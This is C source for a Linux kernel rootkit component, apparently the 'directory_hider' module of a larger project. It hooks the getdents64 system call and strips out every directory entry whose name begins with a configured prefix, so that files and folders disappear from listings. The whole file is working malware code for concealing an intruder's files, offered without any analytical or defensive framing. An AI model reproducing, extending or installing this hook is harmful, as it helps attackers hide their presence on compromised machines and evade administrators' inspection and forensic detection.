#include "../include/directory_hider.h"
#include "../include/config.h"

#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/string.h>

asmlinkage long (*orig_getdents64)(const struct pt_regs *);

asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *user_dir =
        (struct linux_dirent64 __user *)regs->si;

    struct linux_dirent64 *kernel_buf = NULL;
    struct linux_dirent64 *curr = NULL;
    struct linux_dirent64 *prev = NULL;

    unsigned long offset = 0;
    long ret;

    /* Panggil syscall asli */
    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    kernel_buf = kmalloc(ret, GFP_KERNEL);
    if (!kernel_buf)
        return -ENOMEM;

    if (copy_from_user(kernel_buf, user_dir, ret)) {
        kfree(kernel_buf);
        return -EFAULT;
    }

    while (offset < ret) {
        curr = (struct linux_dirent64 *)((char *)kernel_buf + offset);

        if (strncmp(curr->d_name,
                    HIDE_DIR_PREFIX,
                    strlen(HIDE_DIR_PREFIX)) == 0) {

            /* Entry pertama */
            if (curr == kernel_buf) {
                ret -= curr->d_reclen;

                memmove(kernel_buf,
                        (char *)kernel_buf + curr->d_reclen,
                        ret);

                continue;
            }

            /* Entry tengah/akhir */
            if (prev)
                prev->d_reclen += curr->d_reclen;
        } else {
            prev = curr;
            //offset += curr->d_reclen;
        }
	offset += curr->d_reclen;
    }

    if (copy_to_user(user_dir, kernel_buf, ret)) {
        kfree(kernel_buf);
        return -EFAULT;
    }

    kfree(kernel_buf);
    return ret;
}
